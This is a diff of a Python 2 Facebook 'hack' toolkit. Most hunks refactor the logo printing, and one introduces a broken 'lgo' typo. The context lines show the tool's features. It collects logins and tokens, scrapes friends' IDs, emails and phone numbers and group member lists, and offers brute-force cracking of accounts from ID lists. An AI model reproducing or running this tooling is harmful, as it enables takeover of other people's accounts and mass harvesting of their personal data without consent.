@@ -28,6 +28,9 @@ except ImportError:
 from requests.exceptions import ConnectionError
 from mechanize import Browser
 
+def logo():
+	print('FB TOOL KIT')
+
 #exit
 def exit():
     os.system('clear')
@@ -76,7 +79,7 @@ vuln = "\033[32mVuln"
 ##### choices Login #####
 def tool_main_function():
 	os.system('clear')
-	print logo
+	logo()
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
@@ -104,7 +107,7 @@ def login():
 		menu()
 	except (KeyError,IOError):
 		os.system('clear')
-		print logo
+		logo()
 		print('\033[1;91m[☆] \033[1;92mFACEBOOK LOGIN \033[1;91m[☆]')
 		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
 		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
@@ -154,7 +157,7 @@ def login():
 ##### TOKEN #####
 def fbtoken():
 	os.system('clear')
-	print logo
+	logo()
 	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
@@ -200,7 +203,7 @@ def menu():
 		print"\033[1;91m[!] No connection"
 		exit()
 	os.system("reset")
-	print logo
+	logo()
 	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"
 	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
 	print "\033[1;97m╚"+40*"═"
@@ -234,14 +237,14 @@ def choices():
 		func()
 	elif pick =="6":
 		os.system('clear')
-		print logo
+		logo()
 		fb_token=open('login.txt','r').read()
 		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu()
         elif pick =="7":
                 os.system('clear')
-                print logo
+                logo()
                 print 40 * '\033[1;97m\xe2\x95\x90'
                 os.system('git pull origin master')
                 raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
@@ -269,7 +272,7 @@ def information():
 		time.sleep(0.01)
 		login()
 	os.system('clear')
-	print logo
+	logo()
 	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
 	mkdir('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
 	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
@@ -324,7 +327,7 @@ def dump():
 		time.sleep(0.01)
 		login()
 	os.system('clear')
-	print logo
+	logo()
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get group member ID"
@@ -383,7 +386,7 @@ def friends_id():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		r=requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
 		z=json.loads(r.text)
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
@@ -433,7 +436,7 @@ def id_from_friends():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
@@ -491,7 +494,7 @@ def id_member_group():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
@@ -549,7 +552,7 @@ def em_member_group():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
@@ -613,7 +616,7 @@ def no_member_group():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		lgo
 		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
@@ -677,7 +680,7 @@ def email():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
 		a = json.loads(r.text)
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
@@ -733,7 +736,7 @@ def email_from_friends():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
@@ -798,7 +801,7 @@ def phone_number():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
 		print 42*"\033[1;97m═"
 		url= "https://graph.facebook.com/me/friends?access_token="+fb_token
@@ -855,7 +858,7 @@ def phone_number_from_friends():
 		pass
 	try:
 		os.system('clear')
-		print logo
+		logo()
 		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
@@ -915,7 +918,7 @@ def menu_hack():
 		time.sleep(0.01)
 		login()
 	os.system('clear')
-	print logo
+	logo()
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Multi Bruteforce Facebook"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Super Multi Bruteforce Facebook"
@@ -958,7 +961,7 @@ def mini():
 		time.sleep(0.01)
 		login()
 	os.system('clear')
-	print logo
+	logo()
 	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
 	print 42*"\033[1;97m═"
 	try:
@@ -1138,7 +1141,7 @@ def crack():
 		time.sleep(1)
 		login()
 	os.system('clear')
-	print logo
+	logo()
 	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
 	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
 	try:
@@ -1219,7 +1222,7 @@ def super():
 		time.sleep(0.0)
 		login()
 	os.system('clear')
-	print logo
+	logo()
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack from friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack from member group"
@@ -1235,7 +1238,7 @@ def choices_super():
 		choices_super()
 	elif peak =="1":
 		os.system('clear')
-		print logo
+		logo()
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
 		z = json.loads(r.text)
@@ -1243,7 +1246,7 @@ def choices_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print logo
+		logo()
 		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
@@ -2516,13 +2519,13 @@ def jay(fb_token, enable = True):
 	print(res.text)
 	if '"is_shielded":true' in res.text:
 		os.system('clear')
-		print logo
+		logo()
 		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	elif '"is_shielded":false' in res.text:
 		os.system('clear')
-		print logo
+		logo()
 		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
